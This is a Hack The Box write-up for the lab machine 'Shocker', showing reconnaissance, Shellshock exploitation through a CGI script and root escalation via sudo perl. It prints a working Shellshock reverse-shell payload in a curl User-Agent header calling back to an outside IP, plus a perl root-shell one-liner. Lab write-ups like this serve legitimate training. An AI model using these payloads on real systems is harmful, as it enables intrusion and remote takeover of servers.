---
title: "HTB: Shocker"
tags: [htb, linux, easy, shellshock, cgi-bin, perl]

description: "Classic Shellshock (CVE-2014-6271) exploitation against a CGI script."
---

# Hack The Box: Shocker

**Machine IP**: `10.10.10.56`
**OS**: Linux
**Difficulty**: Easy

As the name implies, this box is a demonstration of the **Shellshock** vulnerability (CVE-2014-6271), which affects the Bash shell when processing environment variables.

---

## 1. Reconnaissance

```bash
nmap -sC -sV 10.10.10.56
```
*   **80 (HTTP)**: Apache 2.4.18
*   **2222 (SSH)**: Changing the default SSH port is a mild obfuscation.

Running `gobuster` on port 80 initially finds nothing.
We must look for **CGI** scripts, which are required for Shellshock. We explicitly search for `.sh` and `.cgi` extensions in `/cgi-bin/`.

```bash
gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x sh,cgi
```
**Result**: `/cgi-bin/user.sh` (Status: 200).

Downloading the file, it's just a simple uptime script. But the fact that it ends in `.sh` and is in `cgi-bin` confirms it runs via Bash.

---

## 2. Exploitation (Shellshock)

Shellshock works by appending a command often defined in the `User-Agent` HTTP header.
Bash incorrectly interprets the string `() { :;};` as an empty function definition and proceeds to execute whatever comes after it.

**Payload**:
`() { :;}; /bin/bash -i >& /dev/tcp/10.10.14.14/4444 0>&1`

**Attack**:
```bash
curl -H "User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.14/4444 0>&1" http://10.10.10.56/cgi-bin/user.sh
```

We catch the shell as user `shelly`.

---

## 3. Privilege Escalation

We check sudo permissions.
```bash
sudo -l
```
```text
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

We can run Perl as root. Perl (like Python) can execute system commands.

**Exploit**:
```bash
sudo perl -e 'exec "/bin/sh";'
```

We drop into a root shell immediately.

## Conclusion
*   **User Flag**: `/home/shelly/user.txt`
*   **Root Flag**: `/root/root.txt`

Shellshock was a disaster for the internet in 2014 because practically every CGI script running on Bash was vulnerable. It serves as a reminder that vulnerabilities can exist in the foundational tools (like Bash) we take for granted.
